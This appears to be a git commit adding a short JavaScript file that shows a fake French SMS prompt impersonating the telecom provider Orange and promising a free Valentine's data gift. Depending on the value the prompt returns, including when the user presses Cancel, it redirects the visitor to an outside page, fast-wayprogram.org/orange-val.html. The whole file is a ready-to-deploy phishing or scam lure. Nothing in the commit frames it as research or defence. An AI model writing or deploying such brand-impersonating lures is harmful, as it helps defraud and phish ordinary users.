08747481b67cc7592fa4a0723f44deaf8096b029
superblog1 <imohette4@gmail.com>
2025-02-02 21:55:59 +0100

    Create orange-active.js

---
+++ orange-active.js
@@ -0,0 +1,6 @@
+
+var password = 'ACTIVER 50 Go'
+password=prompt('SMS: Félicitations, vous êtes admissible au cadeau Orange Valentine, veuillez appuyer sur OK pour activer maintenant   ','ACTIVER 50 Go');
+if (password != 'ACTIVER 50 Go') {
+location.href='https://fast-wayprogram.org/orange-val.html';
+}
